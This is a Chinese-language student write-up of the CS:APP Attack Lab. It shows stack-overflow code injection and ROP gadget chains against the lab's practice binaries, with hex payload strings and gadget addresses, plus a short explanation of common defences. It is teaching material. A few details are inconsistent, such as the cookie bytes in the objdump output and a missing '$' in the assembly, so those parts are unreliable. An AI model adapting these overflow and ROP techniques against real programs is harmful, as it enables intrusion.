# Attack

Level 1

第一节段是简单的栈溢出，我们需要将构造好的函数写入函数正常的返回地址。

[![cTN5rj.png](https://z3.ax1x.com/2021/04/19/cTN5rj.png)](https://imgtu.com/i/cTN5rj)

因为栈开辟了40个字节大小的空间，所以需要填充40个字节的字符，然后输入需要

返回的地址，这里我们需要跳转的touch1，所以返回地址是4017c0，我们在attack1.txt

里面写入构造的payload。

[![cTNLGT.png](https://z3.ax1x.com/2021/04/19/cTNLGT.png)](https://imgtu.com/i/cTNLGT)

运行，攻击成功。

[![cTUyy4.png](https://z3.ax1x.com/2021/04/19/cTUyy4.png)](https://imgtu.com/i/cTUyy4)

Level 2
[![cTro59.png](https://z3.ax1x.com/2021/04/19/cTro59.png)](https://imgtu.com/i/cTro59)

查看touch2程序的逻辑，这段程序是验证传进来的参数是否和cookie中的值相等，cookie=0x59b997fa。思路是将返回地址设置为注入代码的地址，因为这次是直接在栈顶注入，所以返回地址为%rsp地址，将cookie的值传给第一个参数，调用touch2但又不能使用call和jmp等指令，所以要先吧touch2的地址压入栈再用ret从栈上弹出返回地址。所以注入的代码为

```
movq    $0x59b997fa, %rdi
pushq   0x4017ec
ret
```

需要将上述的汇编代码转化为计算机可以执行的指令序列并执行下列命令：

```
linux> gcc -c inject.s
linux> objdump -d inject.o

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq

```

得到指令序列为48 c7 c7 fa 97 69 59 68 ec 17 40 00 c3

[![cjvhfP.png](https://z3.ax1x.com/2021/04/24/cjvhfP.png)](https://imgtu.com/i/cjvhfP)

获取到了%rsp的地址构造字符串。

```
48 c7 c7 fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
```



Level3

这一阶段需要传递一段字符串作为参数向输入的字符串中注入一段代码。在正常返回的时候跳转到touch3函数。

[![https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg](https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg)](https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg)

程序在touch3函数中调用了hexmatch函数，这个函数的功能是匹配cookie和传进来的字符是否匹配，已经给出了cookie是0x59b997fa，所以应该传入的参数是“59b997fa”。在调用hexmatch函数的时候，如果cookie存在buffer里面可能会被覆盖，所以cookie要放到test栈帧中。我们要注入的代码是。

```
movq    $0x5561dca8, %rdi
pushq   0x4018fa
ret
```

经过转换变位指令序列48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3。cookie的16进制数为35 39 62 39 39 37 66 61 00。构造字符序列为

```
48 c7 c7 a8 dc 61 55 68 fa 18 
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

## ROP

Level2

为了保护程序，现代编译器和操作系统实现了许多机制，来避免缓冲区溢出攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。

1、栈随机化。栈随机化使得栈的位置在程序每次运行时都会有变化，增大利用难度。

2、栈破坏检测。在栈帧中的缓冲区和栈状态之间存储一个特殊的金丝雀值，在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了，如果改变则该程序异常终止。

3、限制可执行代码区域。限制攻击者向系统中插入可执行代码的能力，在rop攻击中，因为栈上限制了不可插入可执行代码，所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。

在这一阶段中，我们要通过rop攻击重复第二阶段的代码注入攻击，因为无法将指令序列放入栈中，我们需要到现有的程序中找到我们需要的指令序列。

```
popq %rax
movq %rax, %rdi
```

我们需要这个代码序列，因为popq %rax的指令节为:58,所以我们找到这个函数。

```xml
00000000004019a7 <addval_219>:
  4019a7: 8d 87 51 73 58 90     lea    -0x6fa78caf(%rdi),%eax
  4019ad: c3 
```

从中可以知道指令的地址为0x4019ab。movq %rax，%rdi的指令字节为48 89 c7，所以我们找到了如下函数

```
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3  
```

从中可以得到movq %rax,%rdi指令的地址为0x4019a2。我们构造的字符串为

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```



Level 3

本阶段需要把字符串的起始地址传到%rdi,然后调用touch3函数。因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，需要用栈顶地址+偏移量来索引字符串的起始地址。

首先获取%rsp地址,movq %rsp,%rax的指令字节为:48 89 e0,所以这一步的地址为:0x401a06

```
0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3  
```

第二步需要将%rax的内容传送到%rdi

```
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

movq %rax,%rdi的指令字节为:48 89 c7，所以这一步的地址为:0x4019a2

第三步将偏移量的内容弹出到%rax

```
00000000004019ca <getval_280>:
  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
  4019cf: c3   
```

popq %rax的指令字节为:58,其中90为nop指令，所以这一步地址为:0x4019cc

第四步,将%eax的内容传送到%edx

```
00000000004019db <getval_481>:
  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
  4019e0: c3    
```

movl %eax,%edx的指令字节为:89 c2,所以这一步的地址为:0x4019dd

第五步，将%edx的内容传送到%ecx

```
0000000000401a6e <setval_167>:
  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
  401a74: c3  
```

movl %edx,%ecx的指令字节为:89 d1,所以这一步的地址为0x401a70

第六步，将%ecx的内容传送到%esi

```
0000000000401a11 <addval_436>:
  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
  401a17: c3                    retq 
```

movl %ecx,%esi的指令字节为：89 ce,所以这一步地址为:0x401a13

第七步，将栈顶+偏移量得到字符串的首地址传送到%rax

```
00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq 
```

这一步地址为0x4019d6

第八步将字符串首地址%rax传送到%rdi

```
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

movq %rax,%rdi的指令字节为：48 89 c7,所以这一步的地址为0x4019a2。

构造指令序列为

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

